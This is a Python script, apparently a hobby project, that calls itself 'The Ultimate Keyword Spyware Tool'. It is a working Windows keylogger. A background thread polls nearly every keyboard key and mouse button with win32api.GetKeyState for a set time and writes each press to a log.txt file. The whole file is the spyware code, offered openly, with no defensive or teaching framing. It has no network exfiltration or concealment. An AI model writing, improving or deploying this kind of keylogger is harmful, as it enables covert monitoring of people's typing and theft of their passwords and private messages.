# Idea

#print("____________________________________________________________________________________________")
#print("++++++++++++++++++++++++++++++ Python Keyword Tracer +++++++++++++++++++++++++++++++++++++++")
#print("++++++++++++++++++++++++ The Ultimate Keyword Spyware Tool +++++++++++++++++++++++++++++++++")
#print("____________________________________________________________________________________________")
import time
import win32api
# Pywin32 is the module that can be installed by typing " pip install pywin32" in the terminal menu
from time import sleep
from threading import Thread
import sys
snooziness=60
#snooziness = int(input('Enter the amount of seconds you want to run this: '))
stdoutOrigin=sys.stdout
sys.stdout = open("log.txt", "w")

def some_task():
    while True:
        a=win32api.GetKeyState(0x43)
        if a<0:
            print("C is tapped")
            time.sleep(0.2)
        b=win32api.GetKeyState(0x41)
        if b<0:
            print("A is tapped")
            time.sleep(0.2)
        c=win32api.GetKeyState(0x42)
        if c<0:
            print("B is tapped")
            time.sleep(0.2)
        d=win32api.GetKeyState(0x44)
        if d<0:
            print("D is tapped")
            time.sleep(0.2)
        e=win32api.GetKeyState(0x45)
        if e<0:
            print("E is tapped")
            time.sleep(0.2)
        f=win32api.GetKeyState(0x46)
        if f<0:
            print("F is tapped")
            time.sleep(0.2)
        g=win32api.GetKeyState(0x47)
        if g<0:
            print("G is tapped")
            time.sleep(0.2)
        h=win32api.GetKeyState(0x48)
        if h<0:
            print("H is tapped")
            time.sleep(0.2)
        i=win32api.GetKeyState(0x49)
        if i<0:
            print("I is tapped")
            time.sleep(0.2)
        j=win32api.GetKeyState(0x4A)
        if j<0:
            print("J is tapped")
            time.sleep(0.2)
        k=win32api.GetKeyState(0x4B)
        if k<0:
            print("K is tapped")
            time.sleep(0.2)
        l=win32api.GetKeyState(0x4C)
        if l<0:
            print("L is tapped")
            time.sleep(0.2)
        m=win32api.GetKeyState(0x4D)
        if m<0:
            print("M is tapped")
            time.sleep(0.2)
        n=win32api.GetKeyState(0x4E)
        if n<0:
            print("N is tapped")
            time.sleep(0.2)
        o=win32api.GetKeyState(0x4F)
        if o<0:
            print("O is tapped")
            time.sleep(0.2)
        p=win32api.GetKeyState(0x50)
        if p<0:
            print("P is tapped")
            time.sleep(0.2)
        q=win32api.GetKeyState(0x51)
        if q<0:
            print("Q is tapped")
            time.sleep(0.2)
        r=win32api.GetKeyState(0x52)
        if r<0:
            print("R is tapped")
            time.sleep(0.2)
        s=win32api.GetKeyState(0x53)
        if s<0:
            print("S is tapped")
            time.sleep(0.2)
        t=win32api.GetKeyState(0x54)
        if t<0:
            print("T is tapped")
            time.sleep(0.2)
        u=win32api.GetKeyState(0x55)
        if u<0:
            print("U is tapped")
            time.sleep(0.2)
        v=win32api.GetKeyState(0x56)
        if v<0:
            print("V is tapped")
            time.sleep(0.2)
        w=win32api.GetKeyState(0x57)
        if w<0:
            print("W is tapped")
            time.sleep(0.2)
        x=win32api.GetKeyState(0x58)
        if x<0:
            print("X is tapped")
            time.sleep(0.2)
        y=win32api.GetKeyState(0x59)
        if y<0:
            print("Y is tapped")
            time.sleep(0.2)
        z=win32api.GetKeyState(0x5A)
        if z<0:
            print("Z is tapped")
            time.sleep(0.2)
        leftmo=win32api.GetKeyState(0x01)
        if leftmo<0:
            print("Left Mouse Clicked")
            time.sleep(0.2)
        rightmo=win32api.GetKeyState(0x02)
        if rightmo<0:
            print("Right Mouse Clicked")
            time.sleep(0.2)
        backs=win32api.GetKeyState(0x08)
        if backs<0:
            print("Backspace is tapped")
            time.sleep(0.2)
        esck=win32api.GetKeyState(0x1B)
        if esck<0:
            print("Esc is tapped")
            time.sleep(0.2)
        tabk=win32api.GetKeyState(0x09)
        if tabk<0:
            print("Tab is tapped")
            time.sleep(0.2)
        cap=win32api.GetKeyState(0x14)
        if cap<0:
            print("CapsLk is tapped")
            time.sleep(0.2)
        shift=win32api.GetKeyState(0x10)
        if shift<0:
            print("shift is tapped")
            time.sleep(0.2)
        ctrl=win32api.GetKeyState(0x11)
        if ctrl<0:
            print("Ctrl is tapped")
            time.sleep(0.2)
        alt=win32api.GetKeyState(0x12)
        if alt<0:
            print("Alt is tapped")
            time.sleep(0.2)
        pau=win32api.GetKeyState(0x13)
        if pau<0:
            print("pause is tapped")
            time.sleep(0.2)
        space=win32api.GetKeyState(0x20)
        if space<0:
            print("Space Bar is tapped")
            time.sleep(0.2)
        pgup=win32api.GetKeyState(0x21)
        if pgup<0:
            print("Pg Up is tapped")
            time.sleep(0.2)
        pgdw=win32api.GetKeyState(0x22)
        if pgdw<0:
            print("Pg Down is tapped")
            time.sleep(0.2)
        endk=win32api.GetKeyState(0x23)
        if endk<0:
            print("End is tapped")
            time.sleep(0.2)
        homek=win32api.GetKeyState(0x24)
        if homek<0:
            print("Home is tapped")
            time.sleep(0.2)
        leftaw=win32api.GetKeyState(0x25)
        if leftaw<0:
            print("Left Arrow is tapped")
            time.sleep(0.2)
        upaw=win32api.GetKeyState(0x26)
        if upaw<0:
            print("Up Arrow is tapped")
            time.sleep(0.2)
        rightaw=win32api.GetKeyState(0x27)
        if rightaw<0:
            print("Right Key is tapped")
            time.sleep(0.2)
        downaw=win32api.GetKeyState(0x28)
        if downaw<0:
            print("Down Arrow is tapped")
            time.sleep(0.2)
        selectk=win32api.GetKeyState(0x29)
        if selectk<0:
            print("Select key is tapped")
            time.sleep(0.2)
        printk=win32api.GetKeyState(0x2A)
        if printk<0:
            print("Print key is tapped")
            time.sleep(0.2)
        printsrc=win32api.GetKeyState(0x2C)
        if printsrc<0:
            print("Print Screen is tapped")
            time.sleep(0.2)
        delk=win32api.GetKeyState(0x2E)
        if delk<0:
            print("Delete is tapped")
            time.sleep(0.2)
        mmb=win32api.GetKeyState(0x04)
        if mmb<0:
            print("Middle mouse key is tapped")
            time.sleep(0.2)
        und=win32api.GetKeyState(0x07)
        if und<0:
            print("Underfined .-.  is tapped")
            time.sleep(0.2)
        entk=win32api.GetKeyState(0x0D)
        if entk<0:
            print("Enter is tapped")
            time.sleep(0.2)
        num0=win32api.GetKeyState(0x30)
        if num0<0:
            print("0 is tapped")
            time.sleep(0.2)
        num1=win32api.GetKeyState(0x31)
        if num1<0:
            print("1 is tapped")
            time.sleep(0.2)
        num2=win32api.GetKeyState(0x32)
        if num2<0:
            print("2 is tapped")
            time.sleep(0.2)
        num3=win32api.GetKeyState(0x33)
        if num3<0:
            print("3 is tapped")
            time.sleep(0.2)
        num4=win32api.GetKeyState(0x34)
        if num4<0:
            print("4 is tapped")
            time.sleep(0.2)
        num5=win32api.GetKeyState(0x35)
        if num5<0:
            print("5 is tapped")
            time.sleep(0.2)
        num6=win32api.GetKeyState(0x36)
        if num6<0:
            print("6 is tapped")
            time.sleep(0.2)
        num7=win32api.GetKeyState(0x37)
        if num7<0:
            print("7 is tapped")
            time.sleep(0.2)
        num8=win32api.GetKeyState(0x38)
        if num8<0:
            print("8 is tapped")
            time.sleep(0.2)
        num9=win32api.GetKeyState(0x39)
        if num9<0:
            print("9 is tapped")
            time.sleep(0.2)
        wink=win32api.GetKeyState(0x5B)
        if wink<0:
            print("Win Key is tapped")
            time.sleep(0.2)
        apps=win32api.GetKeyState(0x5D)
        if apps<0:
            print("Applications key is tapped")
            time.sleep(0.2)
        nuk1=win32api.GetKeyState(0x61)
        if nuk1<0:
            print("Numpad 1 is tapped")
            time.sleep(0.2)
        nuk2=win32api.GetKeyState(0x62)
        if nuk2<0:
            print("Numpad 2 is tapped")
            time.sleep(0.2)
        nuk3=win32api.GetKeyState(0x63)
        if nuk3<0:
            print("Numpad 3 is tapped")
            time.sleep(0.2)
        nuk4=win32api.GetKeyState(0x64)
        if nuk4<0:
            print("Numpad 4 is tapped")
            time.sleep(0.2)
        nuk5=win32api.GetKeyState(0x65)
        if nuk5<0:
            print("Numpad 5 is tapped")
            time.sleep(0.2)
        nuk6=win32api.GetKeyState(0x66)
        if nuk6<0:
            print("Numpad 6 is tapped")
            time.sleep(0.2)
        nuk7=win32api.GetKeyState(0x67)
        if nuk7<0:
            print("Numpad 7 is tapped")
            time.sleep(0.2)
        nuk8=win32api.GetKeyState(0x68)
        if nuk8<0:
            print("Numpad 8 is tapped")
            time.sleep(0.2)
        nuk9=win32api.GetKeyState(0x69)
        if nuk9<0:
            print("Numpad 9 is tapped")
            time.sleep(0.2)
        nuk0=win32api.GetKeyState(0x60)
        if nuk0<0:
            print(" Numpad 0 is tapped")
            time.sleep(0.2)
        mul=win32api.GetKeyState(0x6A)
        if mul<0:
            print(" Multiply is tapped")
            time.sleep(0.2)
        add=win32api.GetKeyState(0x6B)
        if add<0:
            print(" Addition is tapped")
            time.sleep(0.2)
        sub=win32api.GetKeyState(0x6D)
        if sub<0:
            print(" Substract is tapped")
            time.sleep(0.2)
        div=win32api.GetKeyState(0x6F)
        if div<0:
            print(" Division is tapped")
            time.sleep(0.2)
        dec=win32api.GetKeyState(0x6E)
        if dec<0:
            print(" Decimal is tapped")
            time.sleep(0.2)
        nu=win32api.GetKeyState(0xC0)
        if nu<0:
            print(" ~ is tapped")
            time.sleep(0.2)
        f1=win32api.GetKeyState(0x70)
        if f1<0:
            print(" F1 is tapped")
            time.sleep(0.2)
        f2=win32api.GetKeyState(0x71)
        if f2<0:
            print(" F2 is tapped")
            time.sleep(0.2)
        f3=win32api.GetKeyState(0x72)
        if f3<0:
            print(" F3 is tapped")
            time.sleep(0.2)
        f4=win32api.GetKeyState(0x73)
        if f4<0:
            print(" F4 is tapped")
            time.sleep(0.2)
        f5=win32api.GetKeyState(0x74)
        if f5<0:
            print(" F5 is tapped")
            time.sleep(0.2)
        f6=win32api.GetKeyState(0x75)
        if f6<0:
            print(" F6is tapped")
            time.sleep(0.2)
        f7=win32api.GetKeyState(0x76)
        if f7<0:
            print(" F7 is tapped")
            time.sleep(0.2)
        f8=win32api.GetKeyState(0x77)
        if f8<0:
            print(" F8 is tapped")
            time.sleep(0.2)
        f9=win32api.GetKeyState(0x78)
        if f9<0:
            print(" F9 is tapped")
            time.sleep(0.2)
        f10=win32api.GetKeyState(0x79)
        if f10<0:
            print(" F10is tapped")
            time.sleep(0.2)
        f11=win32api.GetKeyState(0x7A)
        if f11<0:
            print(" F11 is tapped")
            time.sleep(0.2)
        f12=win32api.GetKeyState(0x7B)
        if f12<0:
            print(" F12 is tapped")
            time.sleep(0.2)
        volup=win32api.GetKeyState(0xAF)
        if volup<0:
            print(" Volume Raised")
            time.sleep(0.2)
    
timet = Thread(target=some_task)
timet.daemon = True
timet.start()
print("*****************************************")
print("This is the Python keywoard sniffing tool")
print("*****************************************")
sleep(snooziness)
sys.stdout.close()
sys.stdout=stdoutOrigin          
